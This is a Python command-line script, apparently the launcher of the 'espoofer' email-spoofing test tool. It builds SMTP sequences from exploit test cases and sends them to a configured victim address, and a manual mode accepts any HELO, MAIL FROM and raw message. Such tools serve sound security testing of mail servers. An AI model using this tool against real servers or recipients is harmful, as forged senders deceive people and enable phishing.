import sys
import simplejson as json
import argparse

from colorama import init

from common.common import *
from common.mail_sender import MailSender
from exploits_builder import ExploitsBuilder

import testcases
import config

test_cases = testcases.test_cases
config = config.config

def banner():
    print(("""%s                               ____         
  ___  _________  ____  ____  / __/__  _____
 / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
\___/____/ .___/\____/\____/_/  \___/_/     
        /_/                                 %s
    """ % ('\033[93m', '\033[0m')))


def parser_error(errmsg):
    banner()
    print(("Usage: python " + sys.argv[0] + " [Options] use -h for help"))
    print(("Error: " + errmsg))
    sys.exit()


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(
        epilog='\tExample: \r\npython ' + sys.argv[0] + " -m s -id case_a1")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument(
        '-m', '--mode', choices=['s', 'c', 'm'], default='s', help="Select mode: 's' (default) means server mode; 'c' means clien mode; 'm' means manually setting fields;")
    parser.add_argument(
        '-l', '--list', action='store', default=-1, const=None, nargs='?', help="List all test cases number and short description. `-l case_id' to see details of a specific case.")
    parser.add_argument(
        '-id', '--caseid', default=None, help="Select a specific test case to send email. Effective in server and client mode.")
    parser.add_argument(
    	'-tls', '--starttls', action='store_true', help="Enable STARTTLS command.")

    parser.add_argument(
        '-helo', '--helo', default=None, help="Set HELO domain manually. Effective in manual mode only.")
    parser.add_argument(
        '-mfrom', '--mfrom', default=None, help="Set MAIL FROM address manually. Effective in manual mode only.")
    parser.add_argument(
        '-rcptto', '--rcptto', default=None, help="Set RCPT TO address manually. Effective in manual mode only.")
    parser.add_argument(
        '-data', '--data', default=None, help="Set raw email in DATA command. Effective in manual mode only.")
    parser.add_argument(
        '-ip', '--ip', default=None, help="Set mail server ip manually. Effective in manual mode only.")
    parser.add_argument(
        '-port', '--port', default=None, help="Set mail server port manually. Effective in manual mode only.")

    args = parser.parse_args()
    return args

def check_configs():
	if config["case_id"].decode("utf-8") not in test_cases:
		print("Error: case_id not found in testcases!")
		return -1

	if config["mode"] == 'c' and "client" not in config["case_id"].decode("utf-8"):
		print("Error: case_id should start with 'client_' in client mode!")
		return -1
	if config["mode"] == 's' and "server" not in config["case_id"].decode("utf-8"):
		print("Error: case_id should start with 'server_' in server mode!")
		return -1
	return 0

def list_test_cases(case_id):
	if case_id == None:
		case_ids = test_cases.keys()
		print("%s     %s"% ("Case_id", "Description"))
		print("-------------------------------------")
		for id in case_ids:
			print("%s  %s"% (id, test_cases[id].get("description").decode("utf-8")))

		print("\r\nYou can use '-l case_id' options to list details of a specific case.")
	else:
		if case_id in test_cases:
			print("Here is the details of "+case_id+":")
			print(json.dumps(test_cases[case_id], indent=4))
		else:
			print("Sorry, case_id not found in testcases.")

def main():
	init()
	args = parse_args()
	banner()

	config['mode'] = args.mode

	if args.list != -1:
		list_test_cases(args.list)
		return 0

	if args.caseid:
		config['case_id'] = args.caseid.encode("utf-8") 

	if check_configs() == -1:
		return -1

	print("Start sending emails...")
	
	if args.mode == "s":
		mail_server = config["server_mode"]['recv_mail_server']
		if not mail_server:
			mail_server = get_mail_server_from_email_address(config["victim_address"])
		if not mail_server:
			print("Error: mail server can not be resolved, please set recv_mail_server manually in config.py.")
			return -1
		mail_server_port = config["server_mode"]['recv_mail_server_port']
		starttls = args.starttls if args.starttls else config['server_mode']['starttls']

		exploits_builder = ExploitsBuilder(testcases.test_cases, config)
		smtp_seqs = exploits_builder.generate_smtp_seqs()

		msg_content = config["raw_email"] if config["raw_email"] else smtp_seqs["msg_content"]

		mail_sender = MailSender()
		mail_sender.set_param((mail_server, mail_server_port), helo=smtp_seqs["helo"], mail_from=smtp_seqs["mailfrom"], rcpt_to =smtp_seqs["rcptto"], email_data=msg_content, starttls=starttls)
		mail_sender.send_email()
	
	elif args.mode == "m":
		if not (args.helo and args.mfrom and args.rcptto and args.data and args.ip and args.port):
			print("please set -helo, -mfrom, -rcptto, -data, -ip, and -port")
			return -1

		mail_sender = MailSender()
		mail_sender.set_param((args.ip, int(args.port)), helo=args.helo.encode("utf-8"), mail_from=args.mfrom.encode("utf-8"), rcpt_to=args.rcptto.encode("utf-8"), email_data=args.data.encode("utf-8"), starttls=args.starttls)
		mail_sender.send_email()

	elif args.mode == "c":
		mail_server = config["client_mode"]["sending_server"]

		if not mail_server:
			print("Error: mail server can not be resolved, please set sending_server manually in config.py.")
			return -1

		exploits_builder = ExploitsBuilder(testcases.test_cases, config)
		smtp_seqs = exploits_builder.generate_smtp_seqs()

		msg_content = config["raw_email"] if config["raw_email"] else smtp_seqs["msg_content"]

		mail_sender = MailSender()
		auth_proto = config["client_mode"].get("auth_proto") if config["client_mode"].get("auth_proto") else "LOGIN"
		mail_sender.set_param(mail_server, helo=b"espoofer-MacBook-Pro.local", mail_from= smtp_seqs['mailfrom'], rcpt_to=smtp_seqs["rcptto"], email_data=msg_content, starttls=True, mode="client", username=config["client_mode"]['username'], password=config["client_mode"]['password'], auth_proto = auth_proto)
		mail_sender.send_email()

	print("Finished.")

if __name__ == '__main__':
	main()



